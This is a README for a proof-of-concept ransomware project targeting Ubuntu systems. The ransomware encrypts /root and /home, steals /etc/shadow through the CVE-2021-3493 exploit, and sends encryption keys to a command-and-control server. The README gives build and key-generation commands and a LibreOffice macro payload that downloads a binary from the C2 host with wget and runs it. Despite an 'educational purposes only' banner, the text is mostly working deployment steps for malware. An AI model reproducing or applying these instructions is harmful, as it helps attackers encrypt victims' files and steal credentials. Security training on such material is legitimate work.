# Ransomware
> [!WARNING]
> EDUCATIONAL PURPOSES ONLY
>
>This project is intended solely for educational and research purposes in the context of cybersecurity training. It is designed to study and understand ransomware mechanics in a legal and controlled environment.
>
>DO NOT use this code for malicious purposes. Deploying ransomware on any system without explicit permission is illegal and can result in severe legal consequences.
>
>By using this project, you agree to abide by all applicable laws and take full responsibility for your actions. The author assumes no liability for any misuse.

## Description

This repository is a PoC of a ransomware that encrypts `*/root*` and `*/home*` directories and exfiltrates the `*/etc/shadow*` file using the CVE-2021-3493 vulnerability. It encrypts the file using AES and sends the AES key to the C2 server, where it is encrypted using RSA.

The target machine must meet the following requirements:
- Ubuntu 20.10
- Ubuntu 20.04 LTS
- Ubuntu 19.04
- Ubuntu 18.04 LTS
- Ubuntu 16.04 LTS
- Ubuntu 14.04 ESM

Additionally, the Linux kernel version must be < 5.11.

The original exploit can be found here: [CVE-2021-3493 exploit](https://github.com/briskets/CVE-2021-3493)

## Requirement

```bash
sudo apt update
sudo apt install wget make gcc libssl-dev xz-utils build-essential pkg-confi
pip instal -r requirements.txt
```
The execution of macros must be authorized, and the AppArmor sandbox for LibreOffice must be disabled.


## Generating RSA Keys
Before anything else, we need to generate our RSA key pair.

Run the following commands to create your private and public keys:
```bash
openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048  
openssl rsa -pubout -in private.pem -out public.pem  
```

## Make the binary static
We need to build the libcurl library. Follow these steps:
```bash
wget https://curl.se/download/curl-8.12.1.tar.xz
tar xvf curl-8.12.1.tar.xz
cd  curl-8.12.1
CC=musl-gcc ./configure --disable-shared --enable-static --prefix=/tmp/curl --disable-ldap --disable-sspi --without-librtmp --disable-ftp --disable-file --disable-dict --disable-telnet --disable-tftp --disable-rtsp --disable-pop3 --disable-imap --disable-smtp --disable-gopher --disable-smb --without-libidn --without-ssl --without-nghttp2 --disable-mqtt --without-zlib --without-brotli --without-zstd --without-libpsl --without-libidn2 --disable-docs
make && make install
```
For simplicity, this build process is also defined in the Makefile.

## Malicious file
To deploy the ransomware, we will use a malicious file.odt that contains a malicious macro:
```vba
Sub Main
	Shell("bash -c 'wget http://{C2_SERVER_IP}:8000/ -O /tmp/not_a_malware && chmod +x /tmp/not_a_malware && /tmp/not_a_malware && rm /tmp/not_a_malware'")
End Sub
```
Check this link for instructions on how to add it: [LibreOffice Macro Exploit](https://exploit-notes.hdks.org/exploit/malware/libreoffice-macros/).

## Compiling
Simply run the following command to compile the project:
```bash
make SERVER_IP="{C2_SERVER_IP}"
```

## Demo
[!Demo](https://github.com/user-attachments/assets/36d123e0-5b12-43f4-bb25-d6675cae70b7)